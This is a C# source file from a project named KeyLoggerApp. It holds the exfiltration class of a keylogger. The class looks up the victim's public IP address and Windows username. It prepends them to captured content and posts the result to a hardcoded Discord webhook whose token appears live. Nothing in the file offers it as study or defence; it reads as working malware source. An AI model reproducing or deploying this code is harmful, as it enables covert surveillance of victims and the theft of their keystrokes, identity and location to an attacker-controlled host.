using System.Net;
using System.Text;

namespace KeyLoggerApp
{
    public class DiscordWebhookSender
    {
        private string _webhookUrl;

        public DiscordWebhookSender()
        {
            _webhookUrl = "https://discord.com/api/webhooks/1186946930106957846/4k539rIOiFRMtZDEMzXpR4e9WzX7Hl4xMD-fh0ziuUEIlJdIJ03oj2PBqNEsV8uhy2K0";
        }

        public async Task SendMessageAsync(string messageContent)
        {
            string publicIP = "";
            try
            {
                using (var client = new WebClient())
                {
                    publicIP = client.DownloadString("https://api.ipify.org");
                }
            }
            catch (Exception ex)
            {
            }

            string userName = Environment.UserName;
            messageContent = $"**`{publicIP}`** : `{userName}`\\n" + messageContent;

            using (var httpClient = new HttpClient())
            {
                string jsonPayload = $"{{\"content\":\"{messageContent}\"}}";
                var httpContent = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                try
                {
                    HttpResponseMessage response = await httpClient.PostAsync(_webhookUrl, httpContent);

                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine("Message envoyé avec succès !");
                    }
                    else
                    {
                        Console.WriteLine($"Échec de l'envoi du message : {response.StatusCode}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Erreur lors de l'envoi du message : {ex.Message}");
                }
            }
        }
    }


}
